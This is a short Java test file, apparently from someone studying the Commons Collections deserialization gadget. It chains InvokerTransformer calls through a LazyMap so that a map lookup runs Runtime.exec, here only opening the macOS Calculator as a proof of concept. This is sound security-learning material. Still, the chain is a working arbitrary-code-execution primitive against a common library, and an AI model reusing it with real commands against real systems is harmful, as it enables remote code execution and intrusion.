package Serialization.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/8 10:45
 */
public class InvokeTransformerTest {
    public static void main(String[] args) throws Exception{
//        Runtime.getRuntime().exec("open -a Calculator.app");

//        反射
//        Class<?> aClass = Class.forName("java.lang.Runtime");
//        Method getRuntime = aClass.getDeclaredMethod("getRuntime");
//        Runtime runtime = (Runtime) getRuntime.invoke(null, null);
//        runtime.exec("open -a Calculator.app");


        InvokerTransformer transformer1 = new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null});
        InvokerTransformer transformer2 = new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null});
        InvokerTransformer transformer3 = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a Calculator.app"});
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),transformer1,transformer2,transformer3});

        Map map = new HashMap();
        Map decorate = LazyMap.decorate(map, chainedTransformer);
        decorate.get("random_key");
    }
}
